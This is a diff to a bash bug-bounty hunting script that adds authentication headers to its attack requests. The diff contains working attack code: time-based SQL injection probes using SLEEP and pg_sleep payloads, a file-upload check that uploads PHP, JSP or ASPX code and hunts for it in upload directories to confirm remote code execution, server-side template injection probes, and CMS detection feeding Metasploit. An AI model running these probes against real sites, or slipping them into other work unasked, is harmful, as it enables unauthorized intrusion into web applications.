@@ -60,6 +60,11 @@ RECON_DIR="$(cd "$RECON_DIR" && pwd)"
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
 BASE_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
 
+# Auth-aware hunting: load BBHUNT_AUTH_HEADERS into BB_AUTH_ARGS.
+# shellcheck source=tools/_auth_helper.sh
+. "$SCRIPT_DIR/_auth_helper.sh"
+bb_auth_active && bb_auth_banner
+
 # macOS compatibility: GNU timeout may not exist
 if ! command -v timeout &>/dev/null; then
     if command -v gtimeout &>/dev/null; then
@@ -146,17 +151,17 @@ verify_sqli_poc() {
     log_step "  [VERIFY] Linear scaling check on param #$p_idx ($dialect)..."
     
     # 1. Baseline (0s)
-    T0_START=$(date +%s%N); curl -sk -o /dev/null --max-time 20 "$url"; T0=$(( ($(date +%s%N) - T0_START) / 1000000 ))
-    
+    T0_START=$(date +%s%N); curl -sk -o /dev/null --max-time 20 "${BB_AUTH_ARGS[@]}" "$url"; T0=$(( ($(date +%s%N) - T0_START) / 1000000 ))
+
     # 2. 1s Sleep
     local pl1="'%20AND%20SLEEP(1)--%20"; [ "$dialect" = "postgres" ] && pl1="'||pg_sleep(1)--%20"
     U1=$(echo "$url" | sed "s/=\([^&]*\)/=$pl1/$p_idx")
-    T1_START=$(date +%s%N); curl -sk -o /dev/null --max-time 25 "$U1"; T1=$(( ($(date +%s%N) - T1_START) / 1000000 ))
-    
+    T1_START=$(date +%s%N); curl -sk -o /dev/null --max-time 25 "${BB_AUTH_ARGS[@]}" "$U1"; T1=$(( ($(date +%s%N) - T1_START) / 1000000 ))
+
     # 3. 2s Sleep
     local pl2="'%20AND%20SLEEP(2)--%20"; [ "$dialect" = "postgres" ] && pl2="'||pg_sleep(2)--%20"
     U2=$(echo "$url" | sed "s/=\([^&]*\)/=$pl2/$p_idx")
-    T2_START=$(date +%s%N); curl -sk -o /dev/null --max-time 30 "$U2"; T2=$(( ($(date +%s%N) - T2_START) / 1000000 ))
+    T2_START=$(date +%s%N); curl -sk -o /dev/null --max-time 30 "${BB_AUTH_ARGS[@]}" "$U2"; T2=$(( ($(date +%s%N) - T2_START) / 1000000 ))
     
     D1=$(( T1 - T0 )); D2=$(( T2 - T1 ))
     # Allow 200ms jitter
@@ -172,7 +177,7 @@ verify_upload_poc() {
     
     # Tech Detection
     local ext="php"; local payload='<?php echo "RCE-VAL-".(7*7); ?>'
-    local headers=$(curl -sk -I --max-time 5 "$upload_url" || true)
+    local headers=$(curl -sk -I --max-time 5 "${BB_AUTH_ARGS[@]}" "$upload_url" || true)
     if echo "$headers" | grep -qi "jsp\|java\|tomcat"; then ext="jsp"; payload='<% out.print("RCE-VAL-" + (7*7)); %>'; fi
     if echo "$headers" | grep -qi "asp\|aspx\|\.net"; then ext="aspx"; payload='<% Response.Write("RCE-VAL-" + (7*7)) %>'; fi
     
@@ -182,12 +187,12 @@ verify_upload_poc() {
     
     for param in "file" "upload" "FileData" "userfile" "image"; do
         # Try upload
-        curl -sk -F "${param}=@/tmp/${canary}" --max-time 10 "$upload_url" > /dev/null || true
-        
+        curl -sk -F "${param}=@/tmp/${canary}" --max-time 10 "${BB_AUTH_ARGS[@]}" "$upload_url" > /dev/null || true
+
         # Check common upload dirs
         for dir in "/" "/uploads/" "/files/" "/media/" "/temp/" "/images/" "/wp-content/uploads/"; do
             local probe_url="${base_url}${dir}${canary}"
-            local resp=$(curl -sk -f --max-time 5 "$probe_url" || true)
+            local resp=$(curl -sk -f --max-time 5 "${BB_AUTH_ARGS[@]}" "$probe_url" || true)
             if echo "$resp" | grep -q "RCE-VAL-49"; then
                 log_crit "  [POC-RCE-CONFIRMED] Code Execution Verified: $probe_url"
                 echo "[RCE-POC] $probe_url" >> "$FINDINGS_DIR/upload/verified_rce_pocs.txt"
@@ -244,7 +249,7 @@ if ! skip_has sqli; then
     # 2a. Nuclei
     if tool_ok nuclei; then
         log_step "nuclei SQLi templates..."
-        nuclei -l "$ORDERED_SCAN" -tags sqli -severity medium,high,critical -silent -o "$FINDINGS_DIR/sqli/nuclei_sqli.txt" || true
+        nuclei -l "$ORDERED_SCAN" -tags sqli -severity medium,high,critical -silent "${BB_AUTH_ARGS[@]}" -o "$FINDINGS_DIR/sqli/nuclei_sqli.txt" || true
     fi
     # 2b. Manual Linear-Scaling Probes
     PARAMS_FILE="$RECON_DIR/urls/with_params.txt"
@@ -252,7 +257,7 @@ if ! skip_has sqli; then
         log_step "Advanced SQLi verification on top 10 parameterised URLs..."
         head -10 "$PARAMS_FILE" | while read -r url; do
             [ -z "$url" ] && continue
-            T_START=$(date +%s%N); curl -sk -o /dev/null --max-time 10 "$url"; BASE_MS=$(( ($(date +%s%N) - T_START) / 1000000 ))
+            T_START=$(date +%s%N); curl -sk -o /dev/null --max-time 10 "${BB_AUTH_ARGS[@]}" "$url"; BASE_MS=$(( ($(date +%s%N) - T_START) / 1000000 ))
             P_COUNT=$(echo "$url" | grep -o "=" | wc -l | tr -d ' ')
             [ "$P_COUNT" -eq 0 ] && continue
             for i in $(seq 1 "$P_COUNT"); do
@@ -260,7 +265,7 @@ if ! skip_has sqli; then
                     p="'%20AND%20SLEEP(2)--%20"; [ "$dialect" = "postgres" ] && p="'||pg_sleep(2)--%20"
                     # Fixed sed: use alternate delimiter and correct numeric occurrence
                     SU=$(echo "$url" | sed "s/=\([^&]*\)/=$p/$i")
-                    TS=$(date +%s%N); curl -sk -o /dev/null --max-time 20 "$SU" >/dev/null 2>&1; RC=$?; TE=$(( ($(date +%s%N) - TS) / 1000000 ))
+                    TS=$(date +%s%N); curl -sk -o /dev/null --max-time 20 "${BB_AUTH_ARGS[@]}" "$SU" >/dev/null 2>&1; RC=$?; TE=$(( ($(date +%s%N) - TS) / 1000000 ))
                     if [ "$RC" -eq 0 ] && [ "$((TE - BASE_MS))" -gt 1800 ]; then
                         if verify_sqli_poc "$url" "$i" "$dialect"; then
                             log_crit "EMPIRICAL SQLI POC: $url"
@@ -328,6 +333,7 @@ PYEOF
         --worker 5 \
         --delay 100 \
         --timeout 10 \
+        "${BB_AUTH_ARGS[@]}" \
         --output "$FINDINGS_DIR/xss/dalfox_results.txt" 2>/dev/null || true
     rm -f "$DAL_DEDUP_FILE"
 
@@ -357,7 +363,7 @@ if ! skip_has ssti; then
                 payload="${SSTI_PAYLOADS[$idx]}"
                 enc_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))" 2>/dev/null || echo "$payload")
                 injected=$(echo "$url" | sed "s/=\([^&]*\)/=${enc_payload}/g")
-                body=$(curl -sk --max-time 10 "$injected" 2>/dev/null || true)
+                body=$(curl -sk --max-time 10 "${BB_AUTH_ARGS[@]}" "$injected" 2>/dev/null || true)
                 if echo "$body" | grep -qE '(\b49\b|7777777)'; then
                     log_crit "SSTI confirmed [$engine]: $injected"
                     echo "[SSTI-CONFIRMED] engine=$engine url=$injected" >> "$SSTI_OUT"
@@ -375,7 +381,7 @@ if ! skip_has cms; then
     log_info "Check 7: CMS Detection & MSF Generation"
     head -50 "$ORDERED_SCAN" | while read -r url; do
         [ -z "$url" ] && continue
-        RES=$(curl -sk --max-time 10 "$url" 2>/dev/null || true)
+        RES=$(curl -sk --max-time 10 "${BB_AUTH_ARGS[@]}" "$url" 2>/dev/null || true)
         CMS=""; if echo "$RES" | grep -qi "wp-content\|wordpress"; then CMS="wordpress"; elif echo "$RES" | grep -qi "drupal"; then CMS="drupal"; fi
         if [ -n "$CMS" ]; then
             log_vuln "$CMS detected: $url"
